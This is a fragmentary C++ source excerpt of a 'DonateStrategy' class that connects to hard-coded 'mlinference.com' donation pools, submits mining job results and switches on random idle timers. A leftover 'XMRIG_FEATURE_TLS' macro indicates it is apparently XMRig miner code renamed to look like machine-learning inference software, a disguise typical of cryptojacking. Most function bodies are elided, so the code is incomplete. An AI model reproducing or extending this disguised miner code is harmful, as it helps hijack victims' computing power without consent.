...
static const char *kDonateHost = "donate.v2.mlinference.com";
#ifdef XMRIG_FEATURE_TLS
static const char *kDonateHostTls = "donate.ssl.mlinference.com";
#endif

} // namespace mlinference


mlinference::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener *listener) :
...
mlinference::DonateStrategy::~DonateStrategy()
{
    delete m_timer;
    delete m_strategy;
...
void mlinference::DonateStrategy::update(IClient *client, const Job &job)
{
...
int64_t mlinference::DonateStrategy::submit(const JobResult &result)
{
    return m_proxy ? m_proxy->submit(result) : m_strategy->submit(result);
}


void mlinference::DonateStrategy::connect()
{
    m_proxy = createProxy();
    if (m_proxy) {
        m_proxy->connect();
...
void mlinference::DonateStrategy::setAlgo(const mlinference::Algorithm &algo)
{
    m_algorithm = algo;
...
void mlinference::DonateStrategy::setProxy(const ProxyUrl &proxy)
{
    m_strategy->setProxy(proxy);
}


void mlinference::DonateStrategy::stop()
{
    m_timer->stop();
    m_strategy->stop();
}
...
void mlinference::DonateStrategy::tick(uint64_t now)
{
    m_now = now;
...
void mlinference::DonateStrategy::onActive(IStrategy *, IClient *client)
{
    if (isActive()) {
        return;
    }
...
void mlinference::DonateStrategy::onPause(IStrategy *)
{
}


void mlinference::DonateStrategy::onClose(IClient *, int failures)
{
...
void mlinference::DonateStrategy::onLogin(IClient *, rapidjson::Document &doc, rapidjson::Value &params)
{
...
void mlinference::DonateStrategy::onLogin(IStrategy *, IClient *, rapidjson::Document &doc, rapidjson::Value &params)
{
    setParams(doc, params);
}


void mlinference::DonateStrategy::onLoginSuccess(IClient *client)
{
    if (isActive()) {
        return;
    }
...
void mlinference::DonateStrategy::onVerifyAlgorithm(const IClient *client, const Algorithm &algorithm, bool *ok)
{
    m_listener->onVerifyAlgorithm(this, client, algorithm, ok);
}


void mlinference::DonateStrategy::onVerifyAlgorithm(IStrategy *, const  IClient *client, const Algorithm &algorithm, bool *ok)
{
    m_listener->onVerifyAlgorithm(this, client, algorithm, ok);
}


void mlinference::DonateStrategy::onTimer(const Timer *)
{
    setState(isActive() ? STATE_WAIT : STATE_CONNECT);
}


mlinference::IClient *mlinference::DonateStrategy::createProxy()
{
...
void mlinference::DonateStrategy::idle(double min, double max)
{
    m_timer->start(random(m_idleTime, min, max), 0);
}


void mlinference::DonateStrategy::setJob(IClient *client, const Job &job, const rapidjson::Value &params)
{
    if (isActive()) {
...
void mlinference::DonateStrategy::setParams(rapidjson::Document &doc, rapidjson::Value &params)
{
    using namespace rapidjson;
    auto &allocator = doc.GetAllocator();
...
void mlinference::DonateStrategy::setResult(IClient *client, const SubmitResult &result, const char *error)
{
    m_listener->onResultAccepted(this, client, result, error);
}


void mlinference::DonateStrategy::setState(State state)
{
